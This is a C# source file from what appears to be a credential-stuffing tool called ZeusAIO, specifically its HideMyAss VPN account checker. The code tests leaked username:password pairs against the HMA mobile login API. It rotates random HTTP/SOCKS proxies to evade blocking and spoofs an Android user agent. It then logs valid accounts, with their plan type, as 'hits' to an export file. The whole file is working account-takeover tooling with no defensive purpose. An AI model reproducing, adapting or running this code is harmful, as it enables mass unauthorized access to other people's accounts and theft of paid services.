using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using Leaf.xNet;
using System.Text.RegularExpressions;
using Console = Colorful.Console;
using System.Drawing;
using Valorant;
using System.Net.Security;
using System.Security.Cryptography.X509Certificates;
using ZeusAIO;
using TunnelBear;


namespace HideMyAss

{
    class Check
    {
        public static bool CheckAccount(string[] s, string proxy)
        {
            for (int i = 0; i < Config.config.Retries + 1; i++)
                while (true)
                    try
                    {
                    Retry:
                        using (HttpRequest httpRequest = new HttpRequest())
                        {
                            proxy = ZeusAIO.mainmenu.proxies.ElementAt(new Random().Next(ZeusAIO.mainmenu.proxiesCount));
                            if (ZeusAIO.mainmenu.proxyProtocol == "HTTP")
                            {
                                httpRequest.Proxy = HttpProxyClient.Parse(proxy);
                            }
                            if (ZeusAIO.mainmenu.proxyProtocol == "SOCKS4")
                            {
                                httpRequest.Proxy = Socks4ProxyClient.Parse(proxy);
                            }
                            if (ZeusAIO.mainmenu.proxyProtocol == "SOCKS5")
                            {
                                httpRequest.Proxy = Socks5ProxyClient.Parse(proxy);
                            }
                            httpRequest.UserAgent = "Dalvik/2.1.0 (Linux; U; Android 7.0; SM-G950F Build/NRD90M)";
                        httpRequest.IgnoreProtocolErrors = true;
                        httpRequest.AllowAutoRedirect = true;
                        string str = "username=" + s[0] + "&password=" + s[1];
                        httpRequest.SslCertificateValidatorCallback = (RemoteCertificateValidationCallback)Delegate.Combine(httpRequest.SslCertificateValidatorCallback,
                        new RemoteCertificateValidationCallback((object obj, X509Certificate cert, X509Chain ssl, SslPolicyErrors error) => (cert as X509Certificate2).Verify()));
                        string text2 = httpRequest.Post("https://mobile.api.hmageo.com/clapi/v1.5/user/login", str, "application/x-www-form-urlencoded").ToString();
                        if (text2.Contains("Invalid username/password combination"))
                        {
                            //
                            break;
                        }
                        else if (text2.Contains("{\"status\":0,\"data\":{\"user\":\""))
                            {
                                string text3 = Check.Parse(text2, "\"plan\":\"", "\"");
                                string text4 = Check.Parse(text2, "\"expires\":\"", "\"");
                                ZeusAIO.mainmenu.hits++;
                                if (Config.config.LogorCui== "2")
                                {
                                    Console.WriteLine("[HIT - HMA] " + s[0] + ":" + s[1] + " | Plan: " + text3, Color.Green);
                                }
                                Export.AsResult("/Hma_hits", s[0] + ":" + s[1] + " | Plan: " + text3);
                                return false;
                            }
                        else
                            {
                                ZeusAIO.mainmenu.realretries++;
                                goto Retry;
                            }
                    }
                    //break;
                }
                catch (Exception ex)
                {
                    ZeusAIO.mainmenu.errors++;
                }
            return false;
        }
        private static string Parse(string source, string left, string right)
        {
            return source.Split(new string[1] { left }, StringSplitOptions.None)[1].Split(new string[1]
            {
                right
            }, StringSplitOptions.None)[0];
        }
    }
}

